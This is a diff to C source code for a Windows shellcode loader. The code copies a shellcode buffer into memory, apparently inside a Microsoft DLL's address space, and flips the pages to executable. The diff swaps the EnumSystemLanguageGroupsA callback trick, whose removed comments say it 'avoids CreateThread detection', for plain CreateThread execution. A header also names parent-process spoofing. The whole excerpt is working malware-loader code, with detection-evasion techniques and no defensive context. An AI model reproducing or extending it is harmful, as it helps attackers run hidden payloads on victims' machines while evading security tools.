@@ -439,21 +439,22 @@ static BOOL ms(uint8_t *sc,DWORD n){
         if(!VirtualProtect(dst,n,PAGE_READWRITE,&old))return FALSE;
         memcpy(dst,sc,n);
         VirtualProtect(dst,n,PAGE_EXECUTE_READ,&old);
-        /* Execute via callback — avoids CreateThread detection */
-        EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)(void*)dst,LGRPID_INSTALLED,0);
+        /* Execute from inside the Microsoft DLL's memory space */
+        HANDLE ht=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)(void*)dst,NULL,0,NULL);
+        if(ht){WaitForSingleObject(ht,INFINITE);CloseHandle(ht);}
         return TRUE;}
     return FALSE;
 }
 
-/* ── Fallback: callback exec without CreateThread ────────────────────────── */
+/* ── Fallback: direct thread exec ────────────────────────────────────────── */
 static void cb_exec(uint8_t *sc,DWORD n){
     void *m=VirtualAlloc(NULL,n,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
     if(!m)return;
     memcpy(m,sc,n);
     DWORD old;
     VirtualProtect(m,n,PAGE_EXECUTE_READ,&old);
-    /* EnumSystemLanguageGroups as execution callback — not CreateThread */
-    EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)m,LGRPID_INSTALLED,0);
+    HANDLE ht=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)m,NULL,0,NULL);
+    if(ht){WaitForSingleObject(ht,INFINITE);CloseHandle(ht);}
 }
 
 /* ── EXE exec with PPID spoof ────────────────────────────────────────────── */
